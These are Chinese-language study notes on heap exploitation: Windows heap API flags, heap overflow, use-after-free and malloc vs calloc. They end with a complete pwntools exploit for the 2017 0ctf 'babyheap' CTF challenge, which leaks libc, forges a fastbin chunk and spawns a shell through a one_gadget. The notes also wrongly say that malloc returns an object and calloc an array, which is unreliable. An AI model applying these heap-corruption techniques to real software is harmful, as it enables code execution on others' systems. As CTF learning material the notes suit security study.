PWN

堆溢出

  • 堆是向高地址扩展的（便利也是由低向高进行）
  • 堆是不连续的
  • 使用链表来管理

HeapCreate函数（创建堆）

参数

DWORD flOptions

可以设定0、HEAP_CREATE_ENABLE_EXECUTE、HEAP_GENERATE_EXCEPTIONS、HEAP_NO_SERIALIZE，也可以将它们混合使用

HEAP_CREATE_ENABLE_EXECUTE

0x00040000

设置堆中数据为可执行代码

HEAP_GENERATE_EXCEPTIONS

0x00000004

当堆分配内存失败时会抛出异常，若不设置则返回NULL

HEAP_NO_SERIALIZE

0x00000001

对堆的访问是非独占的，如果一个进程没有完成对堆的操作，其他线程也可以进行堆操作。非常危险，尽量避免使用

SIZE_T dwInitialSize

开始时分配给堆的字节数

SIZE_T dwMaximumSize

堆能增长到的最大大小

若为0表示堆可以在需要的情况下不断增长

HeapAlloc函数（在指定堆上分配内存）

参数

HANDLE hHeap

堆内存开始的位置（句柄）

DWORD dwFlags

堆分配时的可选参数

HEAP_GENERATE_EXCEPTIONS

0x00000004

分配错误抛出异常

HEAP_NO_SERIALIZE

0x00000001

不使用连续存取

HEAP_REALLOC_IN_PLACE_ONLY

0x00000010

内存块被加大时不移动堆中的内存块

HEAP_ZERO_MEMORY

0x00000008

将分配的内存全部置0

SIZE_T dwBytes

要分配的字节数

HeapFree函数（释放堆内存）

参数

HANDLE hHeap

将要被释放的内存块的堆的句柄

DWORD dwFlags

堆释放选项，当使用HeapCreate函数创建堆时，使用以下值来覆盖相应的在flOptions中指定的值

HEAP_NO_SERIALIZE

0x00000001

LPVOID lpMem

指向要释放的内存块的指针

堆溢出利用方法

给堆里面的变量赋予超过其分配的空间大小的值，将后续链表数据覆盖

问题

书中P553

为b分配内存时使用了HEAP_ZERO_MEMORY，但为什么没有将内存清零？

解答

HEAP_ZERO_MEMORY指挥清零Data区，Header头和Flink/Blink不归HeapAlloc函数管

UAF漏洞

  • Use-After-Free 释放后被重用
  • 例：A先后调用BCD这3个子函数
  • B会把A的某个资源释放；C分配内存，会占用B释放的空间；D判断不严谨，即使B把A的资源释放后依然引用它
  • 利用方法：
  • 先让A调用B，B会把A的某个指针释放
  • 再执行C，占用刚才被释放的空间并控制这块内存
  • 最后调用D，由于检查不严格，调用了已经被释放的指针，而该指针已经在C中被重用了，导致漏洞被利用
  • 如何防范：在使用之前判断指针是否有效

malloc和calloc的区别

1、参数个数上的区别：

malloc函数：malloc(size_t size)函数有一个参数，即要分配的内存空间的大小。

calloc函数：calloc(size_t numElements,size_t sizeOfElement)有两个参数，分别为元素的数目和每个元素的大小，这两个参数的乘积就是要分配的内存空间的大小。

2、初始化内存空间上的区别：

malloc函数：不能初始化所分配的内存空间，在动态分配完内存后，里边数据是随机的垃圾数据。

calloc函数：能初始化所分配的内存空间，在动态分配完内存后，自动初始化该内存空间为零。

3、函数返回值上的区别：

malloc函数：函数返回值是一个对象。

calloc函数：函数返回值是一个数组。

2017 0ctf babyheap

from pwn import *
#context.log_level = "debug"

p = process('./babyheap')

offset_libc = 0x3c4b20

def allo(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def fill(index,size,cont):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.sendline(cont)

def free(index):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def dump(index):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def leak_libc():
    allo(0x10)    #no.0
    allo(0x10)    #no.1
    allo(0x10)    #no.2
    allo(0x10)    #no.3
    allo(0x80)    #no.4
    free(2)
    free(1)
    payload = 'a'*0x10 + p64(0) + p64(0x21) + p8(0x80)
    fill(0,len(payload),payload)
    payload = 'a'*0x10 + p64(0) + p64(0x21)
    fill(3,len(payload),payload)
    allo(0x10)    #no.1
    allo(0x10)    #no.2(4)
    allo(0x80)    #no.5
    payload = 'a'*0x10 + p64(0) + p64(0x91)
    fill(3,len(payload),payload)
    free(4)
    dump(2)
    p.recvuntil('Content: \n')
    leak = u64(p.recv(8))
    return leak

leak = leak_libc()
main_arena = leak - 88
libc_base = main_arena - offset_libc
#print('libc base:' + hex(libc_base))
#print('main arena:' + hex(main_arena))

allo(0x60)    #no.4
free(4)
fake_chunk = main_arena - 0x33
payload = p64(fake_chunk)
fill(2,len(payload),payload)
allo(0x60)    #no.4
allo(0x60)    #no.6
one_addr = libc_base + 0x4526a
payload = 'a'*0x13 + p64(one_addr)
fill(6,len(payload),payload)
allo(0x100)

p.interactive()
